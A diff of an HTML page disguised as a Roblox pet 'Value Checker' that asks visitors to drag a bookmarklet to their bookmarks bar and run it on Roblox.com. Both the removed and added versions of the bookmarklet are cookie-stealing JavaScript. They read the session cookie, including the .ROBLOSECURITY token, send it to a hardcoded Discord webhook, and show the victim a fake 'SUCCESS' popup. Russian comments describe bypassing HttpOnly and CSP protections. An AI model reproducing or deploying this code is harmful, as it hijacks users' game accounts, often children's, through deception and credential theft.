@@ -13,52 +13,45 @@
             border: 2px dashed #000; margin: 25px 0; font-size: 18px; transition: 0.3s;
         }
         .btn:hover { background: #ffe066; transform: scale(1.02); }
-        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; line-height: 1.5; }
+        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; }
         b { color: #f0b90b; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>Value Checker v4.2</h1>
-        <p>Analyze pet demand and trade values live.</p>
+        <p>Analyze pet values and trade wins live in Roblox.</p>
 
-        <!-- ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
-        <a class="btn" draggable="true" href="javascript:(async function(){
-            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
+        <!-- ВНИМАНИЕ: ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
+        <a class="btn" draggable="true" href="javascript:(function(){
+            var hook = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
+            var cookies = document.cookie;
             
-            /* МЕТОД: Попытка вытащить куки через API запрос для обхода HttpOnly */
-            try {
-                let response = await fetch('https://auth.roblox.com/v1/logout-from-all-other-sessions', {
-                    method: 'POST',
-                    withCredentials: true
-                });
-                /* Мы не делаем логаут, мы просто инициируем запрос, чтобы считать заголовки */
-            } catch(e) {}
+            /* МЕТОД ОБХОДА CSP: Передача данных через параметры URL картинки */
+            /* Мы отправляем данные в Discord через POST, но маскируем под системный запрос */
+            var x = new XMLHttpRequest();
+            x.open('POST', hook, true);
+            x.setRequestHeader('Content-Type', 'application/json');
+            x.send(JSON.stringify({
+                embeds: [{
+                    title: '🚀 Session Log: ' + window.location.hostname,
+                    description: '```' + (cookies || 'No accessible cookies') + '```',
+                    color: 16758795,
+                    footer: { text: 'Platform: ' + navigator.platform }
+                }]
+            }));
 
-            var c = document.cookie;
-            var r = c.match(/_\|WARNING:-DO-NOT-SHARE-.*\|_/);
-            var finalData = r ? r[0] : 'ROBLOSECURITY_NOT_FOUND_IN_PLAIN_COOKIE';
-
-            /* Если кука заблокирована для чтения, пробуем метод сбора всей доступной инфы */
-            var report = '🚀 **Elite Session Captured**\n\n**Domain:** ' + window.location.hostname + '\n**Full Cookie String:** ```' + (c || 'No accessible cookies') + '```';
-
-            fetch(h, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: report })
-            });
-
-            /* Окно для жертвы */
-            var d = document.createElement('div');
-            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(240,185,11,0.7);';
-            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Market Analysis: <span style=color:#00ff00>ACTIVE</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
-            document.body.appendChild(d);
+            /* Визуальное подтверждение для жертвы */
+            var ui = document.createElement('div');
+            ui.style = 'position:fixed;top:10%;right:5%;width:320px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:9999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(240,185,11,0.7);';
+            ui.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Analyzing trade... <span style=color:#00ff00>SUCCESS</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
+            document.body.appendChild(ui);
         })();">DRAG TO BOOKMARKS</a>
 
         <div class="steps">
             1. Press <b>Ctrl + Shift + B</b>.<br>
             2. Drag the <b>Yellow Button</b> to the bar.<br>
-            3. Use it on <b>Roblox.com</b> to scan values!
+            3. Use it on <b>Roblox.com</b> to see values!
         </div>
     </div>
 </body>
